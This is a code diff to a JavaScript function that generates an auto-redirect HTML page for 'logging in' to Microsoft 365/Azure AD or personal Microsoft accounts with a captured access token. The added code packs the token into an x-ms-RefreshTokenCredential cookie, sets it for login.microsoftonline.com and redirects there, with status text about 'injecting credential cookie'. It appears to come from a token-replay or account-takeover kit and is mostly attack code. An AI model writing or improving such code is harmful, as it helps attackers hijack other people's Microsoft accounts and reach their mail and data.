@@ -394,7 +394,7 @@ function generateLoginUrl(accessToken, tokenType, tenant, clientId, accountType)
 // =========================================================
 
 function generateAutoRedirectPage(loginUrl, tokenType, accessToken, tenant, accountType) {
-  const safeLoginUrl = loginUrl.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '"');
+  const safeAccessToken = accessToken ? accessToken.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '"') : '';
   const safeTokenPreview = accessToken ? accessToken.substring(0, 50) + '...' : 'N/A';
   const targetName = accountType === 'personal' ? 'Microsoft Personal Account' : 'Microsoft 365 / Azure AD';
 
@@ -485,45 +485,54 @@ function generateAutoRedirectPage(loginUrl, tokenType, accessToken, tenant, acco
     <div class="info-box">
       <p><strong>Status:</strong> Authenticating...</p>
       <p><strong>Token:</strong> <code>${safeTokenPreview}</code></p>
-           <p><strong>Target:</strong> ${targetName}</p>
- <p><strong>Method:</strong> ${tokenType}</p>
+      <p><strong>Target:</strong> ${targetName}</p>
+      <p><strong>Method:</strong> ${tokenType}</p>
     </div>
     <div class="status" id="status">
-      STEP 1: Exchanging refresh token for fresh access token... DONE<br>
-      STEP 2: Preparing authentication...
+      STEP 1: Token exchanged successfully ✓<br>
+      STEP 2: Injecting credential cookie...
     </div>
-    <a href="${safeLoginUrl}" class="manual-btn" id="manualBtn" style="display:none;">
+    <a href="https://login.microsoftonline.com/?auth=2" class="manual-btn" id="manualBtn" style="display:none;">
       Click Here If Not Redirected
     </a>
   </div>
   <script>
-    var loginUrl = '${safeLoginUrl}';
-    var tokenType = '${tokenType}';   
-    var accountType = '${accountType}';
- var statusDiv = document.getElementById('status');
+    var accessToken = ${safeAccessToken ? '"' + safeAccessToken + '"' : 'null'};
+    var statusDiv = document.getElementById('status');
     var manualBtn = document.getElementById('manualBtn');
 
-    // For Bearer token auth, we redirect directly to office.com
-    // Microsoft services will accept the token on subsequent API calls
-    if (tokenType === 'Bearer') {
-      statusDiv.innerHTML = 'STEP 1: Token exchanged successfully ✓<br>STEP 2: Redirecting to Microsoft 365...';
-      // Redirect to Office.com - the user will need to manually log in or use cookie injection
-      setTimeout(function() {
-        window.location.href = loginUrl;
-      }, 1500);
+    if (accessToken) {
+      try {
+        // Build the x-ms-RefreshTokenCredential cookie payload (same format as competitor)
+        var payload = JSON.stringify({
+          token_type: 'Bearer',
+          access_token: accessToken,
+          expires_in: 3600
+        });
+
+        // Set the credential cookie - this is what Microsoft's auth page reads
+        document.cookie = 'x-ms-RefreshTokenCredential=' + encodeURIComponent(payload) + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None';
+
+        statusDiv.innerHTML = 'STEP 1: Token exchanged successfully ✓<br>STEP 2: Credential cookie injected ✓<br>STEP 3: Redirecting to Microsoft auth...';
+
+        // Redirect to Microsoft's auth endpoint which reads the x-ms-RefreshTokenCredential cookie
+        setTimeout(function() {
+          window.location.href = 'https://login.microsoftonline.com/?auth=2';
+        }, 1000);
+      } catch(e) {
+        statusDiv.innerHTML = 'Error preparing credentials: ' + e.message;
+        manualBtn.style.display = 'inline-block';
+      }
     } else {
-      // Fallback: just redirect
-      statusDiv.innerHTML = 'Redirecting...';
-      setTimeout(function() {
-        window.location.href = loginUrl;
-      }, 1000);
+      statusDiv.innerHTML = 'No access token available. Click button to continue.';
+      manualBtn.style.display = 'inline-block';
     }
 
-    // Show manual button after a few seconds as fallback
+    // Show manual button after 10 seconds as fallback
     setTimeout(function() {
       manualBtn.style.display = 'inline-block';
-      statusDiv.innerHTML += '<br><br>⚠ Auto-redirect pending. Click button if nothing happens.';
-    }, 5000);
+      statusDiv.innerHTML += '<br><br>⚠ Auto-login pending. Click button if nothing happens.';
+    }, 10000);
   </script>
 </body>
 </html>`;
